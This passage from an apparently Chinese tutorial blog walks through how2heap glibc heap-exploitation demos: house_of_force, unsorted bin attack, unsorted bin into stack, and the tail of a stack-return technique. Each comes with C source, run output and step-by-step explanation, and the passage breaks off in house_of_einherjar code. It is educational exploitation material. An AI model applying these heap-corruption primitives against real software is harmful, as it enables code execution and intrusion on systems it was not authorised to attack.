<p>fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。</p>
</li>
<li><p>现在申请100大小的chunk。此时,p3就相当于victim</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *p3 = malloc(100);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在申请一个100大小的chunk，该chunk将处于栈中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char *p4 = malloc(100);</span><br></pre></td></tr></table></figure>
<p>p4 将指向 &amp;stack_buffer_1 + 0x10 的位置，大小为100,从而可以实现对栈的控制。</p>
</li>
<li><p>修改rip，即可控制跳转到方法<code>jackpot</code>中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcpy((p4+40), &amp;sc, 8);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><p> 一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">		&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">	fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">	intptr_t *p1 = malloc(256);</span><br><span class="line">	fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);</span><br><span class="line">	int real_size = malloc_usable_size(p1);</span><br><span class="line">	fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">	//----- VULNERABILITY ----</span><br><span class="line">	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">	fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br><span class="line">	fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">	//------------------------</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">	   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">	   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line">	 * new_top = old_top + nb</span><br><span class="line">	 * nb = new_top - old_top</span><br><span class="line">	 * req + 2sizeof(long) = new_top - old_top</span><br><span class="line">	 * req = new_top - old_top - 2sizeof(long)</span><br><span class="line">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line">	 * req = dest - old_top - 4*sizeof(long)</span><br><span class="line">	 */</span><br><span class="line">	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">	fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">	   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">	void *new_ptr = malloc(evil_size);</span><br><span class="line">	fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">	void* ctr_chunk = malloc(100);</span><br><span class="line">	fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">	fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">	fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">	fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// some further discussion:</span><br><span class="line">	//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">	//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">	//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">	//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">	//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">	//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">	//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">	//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">	//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&apos;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0xbd9f90.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0xbda110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0xbda110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffffa27f30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0xbda110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure>
<ul>
<li>找到一个需要覆盖的地址</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一个堆块</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intptr_t *p1 = malloc(256);</span><br></pre></td></tr></table></figure>
<p>现在堆中一共有两个chunk，p1和top chunk。</p>
<ul>
<li>假设p1有溢出，可以覆盖top chunk的header部分</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br></pre></td></tr></table></figure>
<p>首先修改top chunk的size为-1,也就是0xffffffffffffffff，这样就可以申请任意长度的chunk，而不用调用mmap。</p>
<ul>
<li>申请evil_size大小的块，计算过程如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line">	 * new_top = old_top + nb</span><br><span class="line">	 * nb = new_top - old_top</span><br><span class="line">	 * req + 2sizeof(long) = new_top - old_top</span><br><span class="line">	 * req = new_top - old_top - 2sizeof(long)</span><br><span class="line">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line">	 * req = dest - old_top - 4*sizeof(long)</span><br><span class="line">	 */</span><br><span class="line">	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; </span><br><span class="line">	void *new_ptr = malloc(evil_size);</span><br></pre></td></tr></table></figure>
<ul>
<li>再申请一个chunk,这时候ctr_chunk将指向bss_var</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void* ctr_chunk = malloc(100);</span><br></pre></td></tr></table></figure>
<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h1><p>为更进一步的攻击做准备，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br><span class="line">		   &quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long stack_var=0;</span><br><span class="line">	fprintf(stderr, &quot;Let&apos;s first look at the target we want to rewrite on stack:\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	unsigned long *p=malloc(400);</span><br><span class="line">	fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;,p);</span><br><span class="line">	fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br><span class="line">           &quot;the first one during the free()\n\n&quot;);</span><br><span class="line">	malloc(500);</span><br><span class="line"></span><br><span class="line">	free(p);</span><br><span class="line">	fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><span class="line">		   &quot;point to %p\n&quot;,(void*)p[1]);</span><br><span class="line"></span><br><span class="line">	//------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">	p[1]=(unsigned long)(&amp;stack_var-2);</span><br><span class="line">	fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;,(void*)p[1]);</span><br><span class="line"></span><br><span class="line">	//------------------------------------</span><br><span class="line"></span><br><span class="line">	malloc(400);</span><br><span class="line">	fprintf(stderr, &quot;Let&apos;s malloc again to get the chunk we just free. During this time, target should has already been &quot;</span><br><span class="line">		   &quot;rewrite:\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./unsorted_bin_attack </span><br><span class="line">This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><br><span class="line">In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let&apos;s first look at the target we want to rewrite on stack:</span><br><span class="line">0x7ffe7322eb88: 0</span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk on the heap at: 0x25b7010</span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f45ea3a6b78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe7322eb78</span><br><span class="line"></span><br><span class="line">Let&apos;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:</span><br><span class="line">0x7ffe7322eb88: 0x7f45ea3a6b78</span><br></pre></td></tr></table></figure>
<ul>
<li>定义一个变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsigned long stack_var=0;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请两个chunk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned long *p=malloc(400);</span><br><span class="line">malloc(500);</span><br></pre></td></tr></table></figure>
<ul>
<li>释放p</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(p);</span><br></pre></td></tr></table></figure>
<ul>
<li>假设p的bk可以被控制</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p[1]=(unsigned long)(&amp;stack_var-2);</span><br></pre></td></tr></table></figure>
<ul>
<li>再申请一个400大小的chunk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(400);</span><br></pre></td></tr></table></figure>
<p>unlink 的对 unsorted bin 的操作是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>而: unsorted_chunks(av) 就是 <code>&lt;main_arena+88&gt;</code></p>
<p>这时候，stack_var的内容将变为&lt;main_arena_88&gt;，而不再是0，从而泄露libc的值。</p>
<h1 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  intptr_t stack_buffer[4] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);</span><br><span class="line">  intptr_t* victim = malloc(0x100);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;);</span><br><span class="line">  intptr_t* p1 = malloc(0x100);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);</span><br><span class="line">  free(victim);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;);</span><br><span class="line">  stack_buffer[1] = 0x100 + 0x10;</span><br><span class="line">  stack_buffer[3] = (intptr_t)stack_buffer;</span><br><span class="line"></span><br><span class="line">  //------------VULNERABILITY-----------</span><br><span class="line">  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;);</span><br><span class="line">  victim[-1] = 32;</span><br><span class="line">  victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack</span><br><span class="line">  //------------------------------------</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %p\n&quot;, &amp;stack_buffer[2]);</span><br><span class="line">  fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, malloc(0x100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocating another chunk to avoid consolidating the top chunk with the small one during the free()</span><br><span class="line">Freeing the chunk 0xaa5010, it will be inserted in the unsorted bin</span><br><span class="line">Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer</span><br><span class="line">Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</span><br><span class="line">Now next malloc will return the region of our fake chunk: 0x7ffea916a680</span><br><span class="line">malloc(0x100): 0x7ffea916a680</span><br></pre></td></tr></table></figure>
<ul>
<li>定义三个变量，并初始化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intptr_t stack_buffer[4] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">intptr_t* victim = malloc(0x100);</span><br><span class="line"></span><br><span class="line">intptr_t* p1 = malloc(0x100);</span><br></pre></td></tr></table></figure>
<ul>
<li>free(victim)</li>
<li>在栈上伪造一个堆块</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_buffer[1] = 0x100 + 0x10;</span><br><span class="line">stack_buffer[3] = (intptr_t)stack_buffer;</span><br></pre></td></tr></table></figure>
<ul>
<li>假设有溢出，可以覆盖victim的size和fd字段</li>
</ul>
<p><strong>Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem</strong></p>
<p>size字段必须和接下来请求的size(也就是0x100)不同，并且需要绕过一个检查。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim[-1] = 32;</span><br><span class="line">victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一个0x100大小chunk，将返回（&amp;stack_buffer[2]）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %p\n&quot;, &amp;stack_buffer[2]);</span><br><span class="line">fprintf(stderr, &quot;malloc(0x100): %p\n&quot;, malloc(0x100));</span><br></pre></td></tr></table></figure>
<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h1><p>该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 PREV_IN_USE 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 